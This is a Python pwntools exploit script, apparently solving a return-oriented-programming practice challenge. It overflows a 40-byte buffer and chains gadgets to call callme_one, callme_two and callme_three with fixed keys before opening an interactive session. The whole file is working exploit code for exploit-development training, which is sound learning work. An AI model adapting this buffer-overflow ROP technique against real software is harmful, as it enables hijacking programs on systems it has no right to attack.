#!/usr/bin/env python3
#

import sys
from pwn import *
from threading import Thread


libc = elf = None


gs = '''
continue
'''
def start():
    if args.DEBUG:
        context.log_level = 'debug'

    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


def send(data):
    io.send(data)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target binary> [GDB] [NOASLR] [DEBUG]")
        exit(1)

    elf = context.binary = ELF(sys.argv[1])

    io = start()
    io.recvuntil(b"> ")
    io.timeout = 0.1

    ### attack
    key1 = p64(0xdeadbeefdeadbeef) # rdi
    key2 = p64(0xcafebabecafebabe) # rsi
    key3 = p64(0xd00df00dd00df00d) # rdx

    # 512 bytes are read, 40th byte causes overflow
    garbage = p8(0x41)*40
    
    rop = b""
    # simple 'ret' to align the stack
    rop += p64(0x00000000004006be)

    #  pop rdi; pop rsi; pop rdx; ret;
    rop += p64(0x000000000040093c)
    rop += key1
    rop += key2
    rop += key3
    rop += p64(elf.plt['callme_one'])

    #  pop rdi; pop rsi; pop rdx; ret;
    rop += p64(0x000000000040093c)
    rop += key1
    rop += key2
    rop += key3
    rop += p64(elf.plt['callme_two'])

    #  pop rdi; pop rsi; pop rdx; ret;
    rop += p64(0x000000000040093c)
    rop += key1
    rop += key2
    rop += key3
    rop += p64(elf.plt['callme_three'])

    payload = garbage + rop
    send(payload)

    ### shell
    io.interactive()
